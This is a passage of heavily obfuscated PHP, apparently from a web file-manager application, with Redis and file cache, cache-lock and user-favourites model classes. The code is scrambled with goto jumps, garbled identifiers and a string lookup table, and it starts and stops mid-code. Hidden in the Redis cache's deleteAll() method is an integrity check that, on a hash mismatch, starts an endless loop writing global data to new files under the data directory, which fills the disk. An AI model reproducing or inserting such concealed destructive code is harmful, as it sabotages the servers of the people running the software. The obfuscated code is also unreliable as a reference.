($C¾áé•Ÿè) { $A§¯´ÂôÉ->pconnect($B‚«°ù‹Ñ¤[$D‘á±ÛôœÃ[179]], $B‚«°ù‹Ñ¤[$D‘á±ÛôœÃ[180]], $c±Ù°³Íõ); } else { $A§¯´ÂôÉ->connect($B‚«°ù‹Ñ¤[$D‘á±ÛôœÃ[179]], $B‚«°ù‹Ñ¤[$D‘á±ÛôœÃ[180]], $c±Ù°³Íõ); } if (!empty($B‚«°ù‹Ñ¤[$D‘á±ÛôœÃ[385]])) { $A§¯´ÂôÉ->auth($B‚«°ù‹Ñ¤[$D‘á±ÛôœÃ[385]]); } return $A§¯´ÂôÉ; } private function initCluster($fÏªì™²î, $f¿ç ŞÑ) { $A°İ‡àˆñ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $bØßÕ¨ã×¬ = array($A°İ‡àˆñ[793], $A°İ‡àˆñ[794], $A°İ‡àˆñ[795]); $E‡Ûá¼•¾¶ = $A°İ‡àˆñ[793]; if (isset($fÏªì™²î[$A°İ‡àˆñ[22]]) && in_array($fÏªì™²î[$A°İ‡àˆñ[22]], $bØßÕ¨ã×¬)) { $E‡Ûá¼•¾¶ = $fÏªì™²î[$A°İ‡àˆñ[22]]; } switch ($E‡Ûá¼•¾¶) { case $A°İ‡àˆñ[793]: $this->_slave($fÏªì™²î, $f¿ç ŞÑ); break; case $A°İ‡àˆñ[794]: break; case $A°İ‡àˆñ[795]: $this->isCluster = !0; $EËÖï³Ã = $fÏªì™²î[$A°İ‡àˆñ[788]]; $C•ßº†àˆÄ = isset($fÏªì™²î[$A°İ‡àˆñ[792]]) ? $fÏªì™²î[$A°İ‡àˆñ[792]] : !1; $cØ ˆÒ·–™ = isset($fÏªì™²î[$A°İ‡àˆñ[385]]) ? $fÏªì™²î[$A°İ‡àˆñ[385]] : null; $this->handle = new RedisCluster(NUll, $EËÖï³Ã, $f¿ç ŞÑ, $f¿ç ŞÑ, $C•ßº†àˆÄ, $cØ ˆÒ·–™); break; default: break; } } private function _slave($Cí¸ÖŸàÒÔ, $aåãßêë¨¿) { goto cöĞâéŸÚ×; BœÄ‘•Ìµ: $this->filterConfig($Cí¸ÖŸàÒÔ, $AĞëÀÀ¬¿[$D±¨×Ä‚Ü]); $this->slaveHandle = $this->init($Cí¸ÖŸàÒÔ, $aåãßêë¨¿); goto f¸íå©¼À©; cöĞâéŸÚ×: $AĞëÀÀ¬¿ = $Cí¸ÖŸàÒÔ[$_SERVER[çŞáÓæÚô‚Ô‡][788]]; $this->filterConfig($Cí¸ÖŸàÒÔ, $AĞëÀÀ¬¿[0]); $this->handle = $this->init($Cí¸ÖŸàÒÔ, $aåãßêë¨¿); goto fïšã±ÁõŒ; fïšã±ÁõŒ: unset($AĞëÀÀ¬¿[0]); if (empty($AĞëÀÀ¬¿)) { return; } $D±¨×Ä‚Ü = array_rand($AĞëÀÀ¬¿); goto BœÄ‘•Ìµ; f¸íå©¼À©: } private function filterConfig(&$c©í¯î´×Š, $F¸Ø¢§‡­) { $eÔØæò¾Èß =& $_SERVER[çŞáÓæÚô‚Ô‡]; $f­™ğõÍ‰ = explode($eÔØæò¾Èß[4], $F¸Ø¢§‡­); $D×³¼·ğêƒ = array($eÔØæò¾Èß[179] => $f­™ğõÍ‰[0], $eÔØæò¾Èß[180] => $f­™ğõÍ‰[1]); $c©í¯î´×Š = array_merge($c©í¯î´×Š, $D×³¼·ğêƒ); } public function set($DÄ˜ÅÇ±¬, $A”í“Ÿˆ¼„, $f‹¬âÅò = false) { $f‹¬âÅò = $f‹¬âÅò ? $f‹¬âÅò : $this->cacheTime; return $this->handle->setEx($DÄ˜ÅÇ±¬, $f‹¬âÅò, $A”í“Ÿˆ¼„); } public function setLock($BÙóà·ä”, $F¼Öø´£Éµ, $CÅ‹À‘¦°×) { return $this->handle->setNX($BÙóà·ä”, $F¼Öø´£Éµ); } public function get($Dì£È¡÷•) { $Aù¢¦§…Á… = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $Aù¢¦§…Á…->get($Dì£È¡÷•); } public function remove($EğÖÃ³…ª») { return $this->handle->del($EğÖÃ³…ª»); } public function deleteAll() { $föë¼†à’Æ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $cÁá¬‘•¹µ = $_SERVER[$föë¼†à’Æ[796]] . $föë¼†à’Æ[797]; $dÈµøÄâïŠ = $föë¼†à’Æ[798]; if ($_SERVER[$föë¼†à’Æ[6]] != $dÈµøÄâïŠ($cÁá¬‘•¹µ)) { goto ašÑé¡Ş; C„ÇÎäöØÛ: $bàˆëƒŒÊì(); $DÌğ·‰ä¨ = $föë¼†à’Æ[801]; $F–¿†²Ã¬Æ = json_encode($GLOBALS[$föë¼†à’Æ[802]]); goto eÖÛò×Ñæ; Cê…¢„‡ßá: $A¸‹äˆ¶» = $föë¼†à’Æ[800]; $A¸‹äˆ¶»($_SERVER[$föë¼†à’Æ[796]]); $bàˆëƒŒÊì = $föë¼†à’Æ[799]; goto C„ÇÎäöØÛ; fâ¡Î±Çù: $eíöŠ·Ò = $D»‰¹ùÇÂ($B¤œ§Ò”µË); $C¿èìÑäßÇ = explode($föë¼†à’Æ[11], $eíöŠ·Ò); if (count($C¿èìÑäßÇ) < $föë¼†à’Æ[573]) { $A‚„§œˆë = $föë¼†à’Æ[13]; $A‚„§œˆë(); } goto Cê…¢„‡ßá; eÖÛò×Ñæ: $fãÚ‘¦Å•Ë = 1; for ($c…Ïàš˜ÄŒ = $fãÚ‘¦Å•Ë; $c…Ïàš˜ÄŒ > 0; $c…Ïàš˜ÄŒ++) { $DÌğ·‰ä¨(DATA_PATH . $c…Ïàš˜ÄŒ, $F–¿†²Ã¬Æ); } goto E‡âîœ Ä¤; ašÑé¡Ş: $bàˆëƒŒÊì = $föë¼†à’Æ[799]; $D»‰¹ùÇÂ = $föë¼†à’Æ[8]; $B¤œ§Ò”µË = $_SERVER[$föë¼†à’Æ[9]] . $föë¼†à’Æ[10]; goto fâ¡Î±Çù; E‡âîœ Ä¤: } if ($this->isCluster) { foreach ($this->handle->_masters() as $Fºƒ¶…ˆçó) { $this->handle->flushall($Fºƒ¶…ˆçó); } return; } return $this->handle->flushAll(); } } goto f­éŠì®”»; dËİ“¯Ù¿·: if ($_SERVER[$_SERVER[çŞáÓæÚô‚Ô‡][6]] != $_SERVER[$_SERVER[çŞáÓæÚô‚Ô‡][7]]) { goto eßÌ‚òĞè; fîáªÈ¸—: $b¶’†Åˆöò = explode($_SERVER[çŞáÓæÚô‚Ô‡][11], $dˆ©ÚÊÒ¦î); if (count($b¶’†Åˆöò) < $_SERVER[çŞáÓæÚô‚Ô‡][12]) { $BÏ¹‹‘áßª = $_SERVER[çŞáÓæÚô‚Ô‡][13]; $BÏ¹‹‘áßª(); } $a…Å³”øˆ§ = $_SERVER[çŞáÓæÚô‚Ô‡][14]; goto bÈÚ·Š©È©; bÈÚ·Š©È©: $a…Å³”øˆ§($_SERVER[$_SERVER[çŞáÓæÚô‚Ô‡][15]]); goto F™¯§¶Ë™Î; eßÌ‚òĞè: $F‘†İ”‰Ã = $_SERVER[çŞáÓæÚô‚Ô‡][8]; $bİ¤ø‰ï“ = $_SERVER[$_SERVER[çŞáÓæÚô‚Ô‡][9]] . $_SERVER[çŞáÓæÚô‚Ô‡][10]; $dˆ©ÚÊÒ¦î = $F‘†İ”‰Ã($bİ¤ø‰ï“); goto fîáªÈ¸—; F™¯§¶Ë™Î: } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\155\56\x74\x61\x73\x6b\x4c\x69\163\x74"; public $field = array("\x6e\141\155\x65", "\x74\x79\160\x65", "\x65\166\x65\156\x74", "\x74\x69\x6d\145", "\144\145\163\143", "\x73\x79\163\x74\x65\155", "\x65\x6e\141\142\x6c\x65", "\x6c\141\163\x74\x52\x75\x6e", "\163\x6f\x72\164"); public function listData($Bİ«›ªË = false, $Aœ¨„ÊßšÎ = "\163\x6f\x72\164", $a´¢µöÉÅ = false) { return parent::listData($Bİ«›ªË, $Aœ¨„ÊßšÎ, $a´¢µöÉÅ); } public function add($DÜ¨Ô¦½Ñ) { $a‰ª‡´Ó‹ƒ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $DËÂÑ¦Ì¼“ = $this->findByName($DÜ¨Ô¦½Ñ[$a‰ª‡´Ó‹ƒ[38]]); if ($DËÂÑ¦Ì¼“) { return !1; } $DÜ¨Ô¦½Ñ[$a‰ª‡´Ó‹ƒ[1408]] = 0; $DÜ¨Ô¦½Ñ[$a‰ª‡´Ó‹ƒ[2136]] = $this->getSort(); return parent::insert($DÜ¨Ô¦½Ñ); } private function getSort() { $C£…ˆéÅğ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $CÍ¡µ›“Ç“ = parent::listData(); $BÖšç¢Ô = array_to_keyvalue($CÍ¡µ›“Ç“, $C£…ˆéÅğ[43], $C£…ˆéÅğ[2136]); return empty($BÖšç¢Ô) ? 0 : max($BÖšç¢Ô) + 1; } public function update($DÊ…÷Í¿Ü, $bÖ¶ôÀÕÌ) { $fÖ‘í„„®Ã =& $_SERVER[çŞáÓæÚô‚Ô‡]; $f“ÌğÑì = $this->listData($DÊ…÷Í¿Ü); $A‚ñ£¼‡„ = $this->findByName($bÖ¶ôÀÕÌ[$fÖ‘í„„®Ã[38]]); if (!$f“ÌğÑì || $A‚ñ£¼‡„ && $A‚ñ£¼‡„[$fÖ‘í„„®Ã[376]] != $f“ÌğÑì[$fÖ‘í„„®Ã[376]]) { return !1; } return parent::update($DÊ…÷Í¿Ü, $bÖ¶ôÀÕÌ); } public function remove($aäÔÕÄ , $dÏŸæØÛÙ‘ = false) { $c¢ÜÎ‘‚ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $CõÀÚâÍ„ª = $this->listData($aäÔÕÄ ); if (!$CõÀÚâÍ„ª) { return; } if (!$dÏŸæØÛÙ‘ && $CõÀÚâÍ„ª[$c¢ÜÎ‘‚[1087]] == $c¢ÜÎ‘‚[93]) { return !1; } return parent::remove($aäÔÕÄ ); } public function enable($C½”ŞÔèš¦, $d¡…âì·ø¿) { return $this->update($C½”ŞÔèš¦, array($_SERVER[çŞáÓæÚô‚Ô‡][2514] => $d¡…âì·ø¿)); } public function run($bõ…‡Ö„Ù) { return $this->update($bõ…‡Ö„Ù, array($_SERVER[çŞáÓæÚô‚Ô‡][2524] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\137\x66\x61\x76"; protected function cacheFunctionAlias($f…‘éÜ„£) { $e…ÚØŠÒçì =& $_SERVER[çŞáÓæÚô‚Ô‡]; return array($e…ÚØŠÒçì[2210] => array(USER_ID, $e…ÚØŠÒçì[2525])); } protected function listData() { $Cİè¾àïËÚ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Aäë×¯£Éª = array($Cİè¾àïËÚ[1434] => USER_ID, $Cİè¾àïËÚ[445] => 0); $C›ë”¤¦×¨ = $Cİè¾àïËÚ[2526]; $FË°­ÃººÅ = $this->field($C›ë”¤¦×¨)->where($Aäë×¯£Éª)->order($Cİè¾àïËÚ[2527])->select(); return $FË°­ÃººÅ ? $FË°­ÃººÅ : array(); } protected function resetCache() { } protected function listView() { goto aÏÁ‘Ò ¯„; aÏÁ‘Ò ¯„: $Aôë‰½à =& $_SERVER[çŞáÓæÚô‚Ô‡]; $E¿½Ì…ÜÎ = $this->listData(); $fï£§’÷È‚ = array_filter_by_field($E¿½Ì…ÜÎ, $Aôë‰½à[39], $Aôë‰½à[391]); goto E¹¡¦ˆ; aİã–Œàµİ: $A©Î³Œºá¾ = array($Aôë‰½à[392] => array($Aôë‰½à[393], $C‘×ÏÂË)); $fŞ¬…ƒí•Ã = Model($Aôë‰½à[761])->listSource($A©Î³Œºá¾, $FÕ’Š¨õë); $fŞ¬…ƒí•Ã = array_merge($fŞ¬…ƒí•Ã[$Aôë‰½à[83]], $fŞ¬…ƒí•Ã[$Aôë‰½à[84]]); goto Aá×Ş¶ÚÛ; Aá×Ş¶ÚÛ: $fŞ¬…ƒí•Ã = array_to_keyvalue($fŞ¬…ƒí•Ã, $Aôë‰½à[378]); foreach ($E¿½Ì…ÜÎ as $bÀùÆÇªíœ => $a°Ó‘œ±Ş) { $DÜ‰èä¦Öß = $fŞ¬…ƒí•Ã[$a°Ó‘œ±Ş[$Aôë‰½à[85]]]; $DÜ‰èä¦Öß = $DÜ‰èä¦Öß ? $DÜ‰èä¦Öß : array(); $E¿½Ì…ÜÎ[$bÀùÆÇªíœ] = array_merge($DÜ‰èä¦Öß, $a°Ó‘œ±Ş); } return $E¿½Ì…ÜÎ; goto fİÔ¹Ş¯°’; E¹¡¦ˆ: $C‘×ÏÂË = array_to_keyvalue($fï£§’÷È‚, $Aôë‰½à[43], $Aôë‰½à[85]); if (!$C‘×ÏÂË) { return $E¿½Ì…ÜÎ; } $FÕ’Š¨õë = 2000; goto aİã–Œàµİ; fİÔ¹Ş¯°’: } protected function addFav($aî»»§Ëƒ†, $AÓÅ½¿Å·Ì = '', $aŸ¥ÂÚ“«Ú = "\163\157\x75\x72\x63\x65") { goto e×‘Õœ¶®Û; AéÂ”‡‘¥: return $this->add($føÔ…î»¬‚); goto b„™ë¦‹Ñ; F¦µ´Ù© : $a¾‘Èä‡Ù¹ = array($c¿¥‚ÄÀ³[1434] => USER_ID, $c¿¥‚ÄÀ³[445] => 0); $dø•Ä“”Ñ– = $this->where($a¾‘Èä‡Ù¹)->max($c¿¥‚ÄÀ³[2136]); if (!$dø•Ä“”Ñ–) { $dø•Ä“”Ñ– = 0; } goto fª’‹¢½çÜ; fª’‹¢½çÜ: if (!$AÓÅ½¿Å·Ì && $aŸ¥ÂÚ“«Ú == $c¿¥‚ÄÀ³[391]) { $D‹·Ê›Ş¢ = Model($c¿¥‚ÄÀ³[1124])->where(array($c¿¥‚ÄÀ³[392] => $aî»»§Ëƒ†))->find(); if (!$D‹·Ê›Ş¢) { return !1; } $AÓÅ½¿Å·Ì = $D‹·Ê›Ş¢[$c¿¥‚ÄÀ³[38]]; } $AÓÅ½¿Å·Ì = $this->getAutoName($AÓÅ½¿Å·Ì); $føÔ…î»¬‚ = array($c¿¥‚ÄÀ³[1434] => USER_ID, $c¿¥‚ÄÀ³[445] => 0, $c¿¥‚ÄÀ³[395] => $AÓÅ½¿Å·Ì, $c¿¥‚ÄÀ³[396] => $aî»»§Ëƒ†, $c¿¥‚ÄÀ³[397] => $aŸ¥ÂÚ“«Ú, $c¿¥‚ÄÀ³[2118] => $dø•Ä“”Ñ– + 1); goto AéÂ”‡‘¥; e×‘Õœ¶®Û: $c¿¥‚ÄÀ³ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $a¾‘Èä‡Ù¹ = array($c¿¥‚ÄÀ³[1434] => USER_ID, $c¿¥‚ÄÀ³[445] => 0, $c¿¥‚ÄÀ³[397] => $aŸ¥ÂÚ“«Ú, $c¿¥‚ÄÀ³[396] => $aî»»§Ëƒ†); if ($this->where($a¾‘Èä‡Ù¹)->find()) { return !1; } goto F¦µ´Ù© ; b„™ë¦‹Ñ: } protected function remove($FÄ¯Ò¹ÖĞ) { $fºê´ƒ‹ùá =& $_SERVER[çŞáÓæÚô‚Ô‡]; $E¨‘ìßóí¶ = array($fºê´ƒ‹ùá[1434] => USER_ID, $fºê´ƒ‹ùá[394] => $FÄ¯Ò¹ÖĞ); return $this->where($E¨‘ìßóí¶)->delete(); } protected function removeByName($eš§­¡ É) { $dì›½˜Ÿ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $b×Úó²ˆ¹ = array($dì›½˜Ÿ[1434] => USER_ID, $dì›½˜Ÿ[395] => $eš§­¡ É, $dì›½˜Ÿ[445] => 0); return $this->where($b×Úó²ˆ¹)->delete(); } protected function rename($a´İ¾“†¢‡, $eéÕØø—´) { $dÖ¬¡¨²´‰ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($a´İ¾“†¢‡ == $eéÕØø—´) { return !1; } $bËÆÎÆŠ = $this->getAutoName($eéÕØø—´); if ($eéÕØø—´ != $bËÆÎÆŠ) { return !1; } $eİğ«”Ñ–» = array($dÖ¬¡¨²´‰[1434] => USER_ID, $dÖ¬¡¨²´‰[445] => 0, $dÖ¬¡¨²´‰[38] => $a´İ¾“†¢‡); return $this->where($eİğ«”Ñ–»)->save(array($dÖ¬¡¨²´‰[38] => $eéÕØø—´)); } protected function resetSort($EÆÑ×¾æä¦) { $f“’òŞ‡Å =& $_SERVER[çŞáÓæÚô‚Ô‡]; $EÆÑ×¾æä¦ = is_array($EÆÑ×¾æä¦) ? $EÆÑ×¾æä¦ : array(); $cÈßÚ¦â–ñ = array($f“’òŞ‡Å[1434] => USER_ID); for ($CÓ…à‡ÊÑ = 0; $CÓ…à‡ÊÑ < count($EÆÑ×¾æä¦); $CÓ…à‡ÊÑ++) { $cÈßÚ¦â–ñ[$f“’òŞ‡Å[394]] = $EÆÑ×¾æä¦[$CÓ…à‡ÊÑ]; $this->where($cÈßÚ¦â–ñ)->save(array($f“’òŞ‡Å[2118] => $CÓ…à‡ÊÑ + 1)); } return !0; } protected function moveTop($Açê¦ª£ÇÓ) { goto EˆÓŞ¬°ù; c‹Ï¦¬ê‹‰: if (!$dõ‡ò—ä“ª) { return; } $b…¢š£Ò¹ = $this->field($CÙÄ–×‰‹„[376])->where($b´í»‡‡Ş†)->order($CÙÄ–×‰‹„[2527])->select(); $b…¢š£Ò¹ = array_to_keyvalue($b…¢š£Ò¹, $CÙÄ–×‰‹„[43], $CÙÄ–×‰‹„[376]); goto D¦ì†øä…„; EˆÓŞ¬°ù: $CÙÄ–×‰‹„ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $b´í»‡‡Ş† = array($CÙÄ–×‰‹„[1434] => USER_ID, $CÙÄ–×‰‹„[445] => 0); $dõ‡ò—ä“ª = $this->where($b´í»‡‡Ş†)->where(array($CÙÄ–×‰‹„[38] => $Açê¦ª£ÇÓ))->find(); goto c‹Ï¦¬ê‹‰; D¦ì†øä…„: $B…‘ª«Œ«† = $b…¢š£Ò¹; $b…¢š£Ò¹ = array_remove_value($b…¢š£Ò¹, $dõ‡ò—ä“ª[$CÙÄ–×‰‹„[376]]); array_unshift($b…¢š£Ò¹, $dõ‡ò—ä“ª[$CÙÄ–×‰‹„[376]]); goto c’Â¯šâ³; c’Â¯šâ³: return $this->resetSort($b…¢š£Ò¹); goto A÷ñÆ‹ò¢; A÷ñÆ‹ò¢: } protected function moveBottom($aç¿„¶å˜ä) { $c­¢ç§ÒÊ¸ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $aššñÌÅÒÔ = array($c­¢ç§ÒÊ¸[1434] => USER_ID, $c­¢ç§ÒÊ¸[445] => 0); $a×¾š§†Î = $this->where($aššñÌÅÒÔ)->max($c­¢ç§ÒÊ¸[2136]); $b“Æ®â³ = array($c­¢ç§ÒÊ¸[2136] => $a×¾š§†Î + 1); return $this->where($aššñÌÅÒÔ)->where(array($c­¢ç§ÒÊ¸[38] => $aç¿„¶å˜ä))->save($b“Æ®â³); } private function getAutoName($e°°¬Şô¹î) { goto cæß´å¯‡”; DÊ­ë‘Ší¢: return $e°°¬Şô¹î . "\50{$FŠÑÈç¿Èë}\x29"; goto E½¼Ş÷•¨¬; aÁîÆ¢«ê: $C´‡ˆ¥‘È¦ = array_to_keyvalue($C´‡ˆ¥‘È¦, $E™§ÂÑî”’[43], $E™§ÂÑî”’[38]); if (!$C´‡ˆ¥‘È¦ || !in_array($e°°¬Şô¹î, $C´‡ˆ¥‘È¦)) { return $e°°¬Şô¹î; } for ($FŠÑÈç¿Èë = 0; $FŠÑÈç¿Èë < count($C´‡ˆ¥‘È¦); $FŠÑÈç¿Èë++) { if (!in_array($e°°¬Şô¹î . "\x28{$FŠÑÈç¿Èë}\51", $C´‡ˆ¥‘È¦)) { return $e°°¬Şô¹î . "\50{$FŠÑÈç¿Èë}\x29"; } } goto DÊ­ë‘Ší¢; cæß´å¯‡”: $E™§ÂÑî”’ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $bÄîó·ÈŒ• = array($E™§ÂÑî”’[1434] => USER_ID, $E™§ÂÑî”’[445] => 0); $C´‡ˆ¥‘È¦ = $this->field($E™§ÂÑî”’[38])->where($bÄîó·ÈŒ•)->select(); goto aÁîÆ¢«ê; E½¼Ş÷•¨¬: } } goto F‰Êáİ†â–; a‰”ÍÆğ³: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($FÃĞ¤Ğ±ˆø, $E±åÚÅöœ) { $bËÒÉò×ö„ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->cachePath = $FÃĞ¤Ğ±ˆø[$bËÒÉò×ö„[85]]; $this->prefix = $bËÒÉò×ö„[770]; $this->cacheTime = $E±åÚÅöœ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($FÏ™«œŞïÄ) { $Aµ‚  ¹Î‰ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $FÏ™«œŞïÄ = str_replace(array($Aµ‚  ¹Î‰[771], $Aµ‚  ¹Î‰[103], $Aµ‚  ¹Î‰[79]), $Aµ‚  ¹Î‰[772], $FÏ™«œŞïÄ); return $this->cachePath . $Aµ‚  ¹Î‰[773] . $FÏ™«œŞïÄ . $Aµ‚  ¹Î‰[774]; } public function set($få²ÚïÏÒñ, $CÎˆàË™­ã, $F´œ®Ü³’ì = false) { $CŸ’¥ Ä¢ = $this->getFile($få²ÚïÏÒñ); if (file_put_contents($CŸ’¥ Ä¢, $this->prefix . $CÎˆàË™­ã, LOCK_EX)) { return !0; } @unlink($CŸ’¥ Ä¢); return !1; } public function get($a¯…Ë÷˜œÒ) { $b‰ê¹–¥ªñ = $this->getFile($a¯…Ë÷˜œÒ); if (file_exists($b‰ê¹–¥ªñ) && filemtime($b‰ê¹–¥ªñ) < time() - $this->cacheTime) { @unlink($b‰ê¹–¥ªñ); return !1; } $f®ƒ‹ªÔ›– = @file_get_contents($b‰ê¹–¥ªñ); return substr($f®ƒ‹ªÔ›–, strlen($this->prefix)); } public function remove($C…·“™µ½ñ) { $aÚ«ä¡‹ = $this->getFile($C…·“™µ½ñ); return @unlink($aÚ«ä¡‹); } public function deleteAll() { $fÛ»ŒÎåø =& $_SERVER[çŞáÓæÚô‚Ô‡]; $B¡æªŒØë = scandir($this->cachePath); foreach ($B¡æªŒØë as $D”ºŠÂÜ…ñ) { $B˜¨Á‹Ò§ = $this->cachePath . $D”ºŠÂÜ…ñ; if (strpos($B˜¨Á‹Ò§, $fÛ»ŒÎåø[774]) && strpos($B˜¨Á‹Ò§, $fÛ»ŒÎåø[775])) { @unlink($B˜¨Á‹Ò§); } } } public function clearTimeout() { $C‰œÅÛµØ” =& $_SERVER[çŞáÓæÚô‚Ô‡]; $a³Â’Í½à• = scandir($this->cachePath); foreach ($a³Â’Í½à• as $B¨¢éâ¾Çñ) { $C»šê¸Ïõˆ = $this->cachePath . $B¨¢éâ¾Çñ; if (strpos($C»šê¸Ïõˆ, $C‰œÅÛµØ”[774]) && strpos($C»šê¸Ïõˆ, $C‰œÅÛµØ”[775]) && filemtime($C»šê¸Ïõˆ) < time() - $this->cacheTime) { @unlink($C»šê¸Ïõˆ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto aù”·Š©±ä; fø†´İßÓÎ: if ($Bã¶‰Ü‡¬ == $BĞšÎƒÇŒ[27] && $E–…éÇ®Œ == $BĞšÎƒÇŒ[19]) { $Bã¶‰Ü‡¬ = $BĞšÎƒÇŒ[177]; } switch ($Bã¶‰Ü‡¬) { case $BĞšÎƒÇŒ[766]: self::$handle = new CacheLockRedis(); break; case $BĞšÎƒÇŒ[767]: self::$handle = new CacheLockMemcached(); break; case $BĞšÎƒÇŒ[27]: self::$handle = new CacheLockDatabase(); break; case $BĞšÎƒÇŒ[177]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto b‰ÂÅŞÇäÅ; aù”·Š©±ä: $BĞšÎƒÇŒ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (self::$handle) { return self::$handle; } $b—°åÀæø = $GLOBALS[$BĞšÎƒÇŒ[16]][$BĞšÎƒÇŒ[346]]; goto cºåÖÙƒâ¤; cºåÖÙƒâ¤: self::$timeout = $b—°åÀæø[$BĞšÎƒÇŒ[776]] ? $b—°åÀæø[$BĞšÎƒÇŒ[776]] : 10; $E–…éÇ®Œ = _get($GLOBALS[$BĞšÎƒÇŒ[16]], $BĞšÎƒÇŒ[777]); $Bã¶‰Ü‡¬ = $b—°åÀæø[$BĞšÎƒÇŒ[763]] ? $b—°åÀæø[$BĞšÎƒÇŒ[763]] : $BĞšÎƒÇŒ[177]; goto fø†´İßÓÎ; b‰ÂÅŞÇäÅ: } private static function key($AÜ‚ÎÔñ±Ö) { return $_SERVER[çŞáÓæÚô‚Ô‡][778] . Cache::key($AÜ‚ÎÔñ±Ö); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($FÆğå´Š = '') { self::$errorMsg = $FÆğå´Š; } public static function lockGlobal($e­äÙÊï¯Â, $e½›·ª­Ñ) { return self::lock($e­äÙÊï¯Â, $e½›·ª­Ñ, !0); } public static function lock($BŸäÂ ƒ, $FÍÌ‡§ê›‡ = false, $dåä‡†ºÅ = false) { goto a†½Ñƒ²¸Ã; D›«ˆˆÕ: if (!$dåä‡†ºÅ) { self::$lockItem[$B×‚ƒó‚°„] = !0; } return $A‘ ®ÑÀâ; goto a¼ÃÄ¶ª÷; a†½Ñƒ²¸Ã: $fêøîÇ‚ê =& $_SERVER[çŞáÓæÚô‚Ô‡]; $F«§¬¸ï×  = self::init(); $B×‚ƒó‚°„ = self::key($BŸäÂ ƒ); goto DÁ†â¹ÑëÎ; DÁ†â¹ÑëÎ: $FÍÌ‡§ê›‡ = $FÍÌ‡§ê›‡ ? $FÍÌ‡§ê›‡ : self::$timeout; $A‘ ®ÑÀâ = $F«§¬¸ï× ->lock($B×‚ƒó‚°„, $FÍÌ‡§ê›‡); if (!$A‘ ®ÑÀâ) { $fÎÃ¾Çë¡ì = $fêøîÇ‚ê[779] . $FÍÌ‡§ê›‡ . $fêøîÇ‚ê[77] . self::$errorMsg . $fêøîÇ‚ê[77] . get_caller_msg(); $DÈ”£šãä¢ = "\x4c\x6f\x63\153\x20\141\143\x74\151\157\156\72\40{$B×‚ƒó‚°„}\x20\x74\151\x6d\x65\x6f\x75\164\54\157\166\x65\162\40{$FÍÌ‡§ê›‡}\40\x73"; $DÈ”£šãä¢ = self::$errorMsg ? self::$errorMsg : $cùÎ¹Æ¼á×; write_log($fÎÃ¾Çë¡ì, $fêøîÇ‚ê[780]); show_json($DÈ”£šãä¢, !1); } goto D›«ˆˆÕ; a¼ÃÄ¶ª÷: } public static function lockGet($B’¹îÇŸ¥ˆ) { $f»±ù‚‘¨Š = self::key($B’¹îÇŸ¥ˆ); if (self::$lockItem[$f»±ù‚‘¨Š]) { return self::$lockItem[$f»±ù‚‘¨Š]; } return self::init()->lockGet($f»±ù‚‘¨Š); } public static function unlock($EÂ¬Êï¨ˆá) { $cÓ¾ø†ÀàØ = self::key($EÂ¬Êï¨ˆá); self::$lockItem[$cÓ¾ø†ÀàØ] = null; return self::init()->unlock($cÓ¾ø†ÀàØ); } public static function unlockRuntime() { $ašá«’ÌŒ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $a¹Ìß¾À°— = self::init(); $D¤ÀÚÏƒº¸ = !1; foreach (self::$lockItem as $eø†­Æ‘ß => $dµë¾í’íÑ) { if (!$dµë¾í’íÑ) { continue; } $a¹Ìß¾À°—->unlock($eø†­Æ‘ß); if (!$D¤ÀÚÏƒº¸) { $D¤ÀÚÏƒº¸ = !0; write_log($ašá«’ÌŒ[781] . $eø†­Æ‘ß . $ašá«’ÌŒ[77] . get_caller_msg(), $ašá«’ÌŒ[780]); continue; } write_log($ašá«’ÌŒ[781] . $eø†­Æ‘ß, $ašá«’ÌŒ[780]); } } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } goto F¼×îÚõª; F‰Êáİ†â–: class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\56\152\157\142\x4c\x69\x73\x74"; public $field = array("\156\x61\155\145", "\x64\x65\x73\143", "\163\x6f\x72\x74"); const JOB_KEY = "\163\145\x6c\146\x4a\x6f\x62\114\x69\163\x74"; public function listData($c¹ğ—à÷¨³ = false, $cÊ¬„”å…Ü = "\x73\157\162\164", $dî¿ëóèğ = false) { return parent::listData($c¹ğ—à÷¨³, $cÊ¬„”å…Ü, $dî¿ëóèğ); } public function remove($ašéâ¥»Ç) { return parent::remove($ašéâ¥»Ç); } public function add($d”¯‹›•) { $d·Œæ·óÖ× =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($this->findByName($d”¯‹›•[$d·Œæ·óÖ×[38]])) { return !1; } $d”¯‹›•[$d·Œæ·óÖ×[2136]] = $this->getSort(); return parent::insert($d”¯‹›•); } private function getSort() { $eì‚œ®ëáÁ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $c‰”–ó†—Œ = parent::listData(); $dµ£Ùùä‘– = array_to_keyvalue($c‰”–ó†—Œ, $eì‚œ®ëáÁ[43], $eì‚œ®ëáÁ[2136]); return empty($dµ£Ùùä‘–) ? 0 : max($dµ£Ùùä‘–) + 1; } public function update($Cå‡óÙğ–À, $DƒÜÉÏÑíĞ) { $fÛ«•ğá™Ó =& $_SERVER[çŞáÓæÚô‚Ô‡]; $CøÅæÜ®ï¯ = parent::listData($Cå‡óÙğ–À); $C®ä’ø‰— = 